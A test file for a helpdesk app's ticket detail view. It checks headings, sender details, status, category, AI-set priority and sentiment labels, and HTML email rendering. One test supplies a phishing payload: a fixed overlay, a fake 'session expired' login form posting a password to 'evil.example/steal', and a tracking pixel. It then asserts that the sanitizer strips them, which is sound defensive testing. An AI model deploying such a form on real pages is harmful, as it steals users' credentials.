import { screen } from '@testing-library/react'
import { describe, expect, it } from 'vitest'
import { TicketCategory, TicketPriority, TicketSentiment, TicketStatus } from '@helpdesk/core'
import { renderWithQuery } from '@/test/render'
import type { TicketDetail as TicketDetailData } from '@/hooks/use-tickets'
import { TicketDetail } from './TicketDetail'

const ticket: TicketDetailData = {
  id: 7,
  subject: 'Refund for the Advanced React course',
  body: 'Please refund me.\nI bought it twice.',
  fromName: 'Jane Student',
  fromEmail: 'jane@example.com',
  bodyHtml: null,
  messageId: null,
  resolvedByAi: false,
  status: TicketStatus.OPEN,
  category: TicketCategory.REFUND_REQUEST,
  priority: null,
  sentiment: null,
  createdAt: '2026-11-11T10:30:00.000Z',
  updatedAt: '2026-11-11T10:30:00.000Z',
  assignedTo: null,
}

const formatDate = (iso: string) =>
  new Intl.DateTimeFormat(undefined, { dateStyle: 'medium', timeStyle: 'short' }).format(new Date(iso))

describe('TicketDetail', () => {
  it('renders the subject as the page heading', () => {
    renderWithQuery(<TicketDetail ticket={ticket} />)

    expect(screen.getByRole('heading', { level: 1, name: ticket.subject })).toBeInTheDocument()
  })

  it('shows a placeholder when the subject is empty', () => {
    renderWithQuery(<TicketDetail ticket={{ ...ticket, subject: '' }} />)

    expect(screen.getByRole('heading', { level: 1, name: '(no subject)' })).toBeInTheDocument()
  })

  it('shows the sender name, email and date', () => {
    renderWithQuery(<TicketDetail ticket={ticket} />)

    expect(
      screen.getByText(`From Jane Student <jane@example.com> · ${formatDate(ticket.createdAt)}`),
    ).toBeInTheDocument()
  })

  it('shows the message body', () => {
    renderWithQuery(<TicketDetail ticket={ticket} />)

    expect(screen.getByText(/Please refund me\./)).toHaveTextContent('Please refund me. I bought it twice.')
  })

  it('shows the status and category', () => {
    renderWithQuery(<TicketDetail ticket={ticket} />)

    expect(screen.getByText('Open')).toBeInTheDocument()
    expect(screen.getByText('Refund request')).toBeInTheDocument()
  })

  it('shows the priority and sentiment the AI set', () => {
    renderWithQuery(
      <TicketDetail ticket={{ ...ticket, priority: TicketPriority.URGENT, sentiment: TicketSentiment.NEGATIVE }} />,
    )

    expect(screen.getByText('Urgent')).toBeInTheDocument()
    expect(screen.getByText('Negative')).toBeInTheDocument()
    expect(screen.queryByText(TicketPriority.URGENT)).not.toBeInTheDocument()
  })

  it('labels every priority and sentiment with a readable word', () => {
    for (const [priority, label] of [
      [TicketPriority.LOW, 'Low'],
      [TicketPriority.MEDIUM, 'Medium'],
      [TicketPriority.HIGH, 'High'],
    ] as const) {
      const { unmount } = renderWithQuery(<TicketDetail ticket={{ ...ticket, priority }} />)
      expect(screen.getByText(label)).toBeInTheDocument()
      unmount()
    }
    for (const [sentiment, label] of [
      [TicketSentiment.POSITIVE, 'Positive'],
      [TicketSentiment.NEUTRAL, 'Neutral'],
    ] as const) {
      const { unmount } = renderWithQuery(<TicketDetail ticket={{ ...ticket, sentiment }} />)
      expect(screen.getByText(label)).toBeInTheDocument()
      unmount()
    }
  })

  it('shows no priority or sentiment while the AI has not set them', () => {
    renderWithQuery(<TicketDetail ticket={ticket} />)

    for (const word of ['Low', 'Medium', 'High', 'Urgent', 'Positive', 'Neutral', 'Negative', 'Not set']) {
      expect(screen.queryByText(word)).not.toBeInTheDocument()
    }
  })

  it('shows Uncategorized when there is no category', () => {
    renderWithQuery(<TicketDetail ticket={{ ...ticket, category: null }} />)

    expect(screen.getByText('Uncategorized')).toBeInTheDocument()
  })

  describe('HTML body', () => {
    it('renders a formatted email with bold text and a link that opens in a new tab', () => {
      const bodyHtml = '<p>Hello <b>team</b>, see <a href="https://example.com/order/42">my order</a></p>'
      renderWithQuery(<TicketDetail ticket={{ ...ticket, bodyHtml }} />)

      expect(screen.getByText('team').tagName).toBe('B')
      const link = screen.getByRole('link', { name: 'my order' })
      expect(link).toHaveAttribute('href', 'https://example.com/order/42')
      expect(link).toHaveAttribute('target', '_blank')
      expect(link).toHaveAttribute('rel', 'noopener noreferrer')
    })

    it('does not render a fake login form, its styling or an image sent by the customer', () => {
      const bodyHtml =
        '<style>.x{position:fixed;inset:0}</style><form action="https://evil.example/steal"><p>Session expired, sign in again</p>' +
        '<input type="password" aria-label="Password"><button type="submit">Sign in</button></form><img alt="pixel" src="https://tracker.example/p.gif">'
      const { container } = renderWithQuery(<TicketDetail ticket={{ ...ticket, bodyHtml }} />)

      expect(container.querySelector('form, input, style, img')).toBeNull()
      expect(screen.queryByLabelText('Password')).not.toBeInTheDocument()
      expect(screen.queryByRole('textbox')).not.toBeInTheDocument()
      expect(screen.queryByRole('button', { name: 'Sign in' })).not.toBeInTheDocument()
    })

    it('shows the plain text body when there is no HTML', () => {
      renderWithQuery(<TicketDetail ticket={{ ...ticket, bodyHtml: null }} />)

      expect(screen.getByText(/Please refund me\./)).toBeInTheDocument()
    })
  })

  it('does not render a reply form', () => {
    renderWithQuery(<TicketDetail ticket={ticket} />)

    expect(screen.queryByRole('heading', { name: 'Replies' })).not.toBeInTheDocument()
    expect(screen.queryByRole('textbox')).not.toBeInTheDocument()
  })
})
